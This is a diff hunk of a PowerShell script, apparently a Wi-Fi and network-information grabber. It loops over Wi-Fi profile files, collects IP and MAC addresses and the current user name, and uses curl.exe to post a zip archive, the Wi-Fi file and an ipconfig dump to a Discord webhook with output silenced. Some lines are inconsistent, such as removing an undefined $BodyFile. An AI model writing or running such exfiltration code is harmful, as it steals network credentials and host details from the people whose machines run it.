@@ -23,26 +23,20 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
 }
 
 
-$netInfoText = (Get-NetAdapter | ForEach-Object {
-    $i = $_
-    $ips = Get-NetIPAddress -InterfaceIndex $i.ifIndex -ErrorAction SilentlyContinue
-    $ipv4 = ($ips | Where-Object AddressFamily -eq IPv4 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
-    $ipv6 = ($ips | Where-Object AddressFamily -eq IPv6 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
-    "$($i.Name): MAC=$($i.MacAddress) IPv4=$ipv4 IPv6=$ipv6"
-}) -join "`n"
+$ipv4 = ipconfig /all | Select-String "IPv4 Address" | ForEach-Object { ($_ -split ':')[-1].Trim() }
+$ipv6 = ipconfig /all | Select-String "IPv6 Address" | ForEach-Object { ($_ -split ':')[-1].Trim() }
+$mac = ipconfig /all | Select-String "Physical Address" | ForEach-Object { ($_ -split ':')[-1].Trim() }
 
 
 
 # Send to discord
 
-$content = "Network summary:`n```$netInfoText```"
 
 
-$Body = @"
-content=$content
-"@
-
-curl.exe -X POST $wh -F @$Body -F "file1=@$zip" -F "file2=@$wifiFile" -F "file3=@$e\ipcfg.txt" *> $null   
+$whoami_content = whoami
+"content=@everyone: $whoami_content"
+curl.exe -X POST $wh -F "file1=@$zip" -F "file2=@$wifiFile" -F "file3=@$e\ipcfg.txt" *> $null
+Remove-Item $BodyFile   
 
 # cleanup
 #cls
